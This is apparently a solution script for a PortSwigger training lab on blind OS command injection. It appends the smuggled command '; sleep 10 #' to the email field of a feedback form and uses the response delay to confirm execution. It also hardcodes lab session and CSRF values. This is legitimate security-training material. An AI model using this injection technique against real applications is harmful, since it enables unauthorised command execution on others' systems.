# Lab: Blind OS command injection with time delays
# difficulty: practitioner

import requests

sub = '0a89007c039e7444801735e3006f00ed'
url = f'https://{sub}.web-security-academy.net'

def main():
    header = {
        'Cookie': 'session=BUZVmXQTMQlYXj1iLMF6lmbq9FeZFt7M'
    }

    payload = '; sleep 10 #' # blind RCE
    body = {
        'csrf': 'WI9QBy3n9qBbQ4EHHGQTxvVXM1dpERZ3',
        'name': 'name',
        'email': 'email' + payload,
        'subject': 'subject',
        'message': 'message'
    }
    
    endpoint = '/feedback/submit'
    r = requests.post(url + endpoint, headers=header, data=body)
    print(r.text)

if __name__ == '__main__':
    main()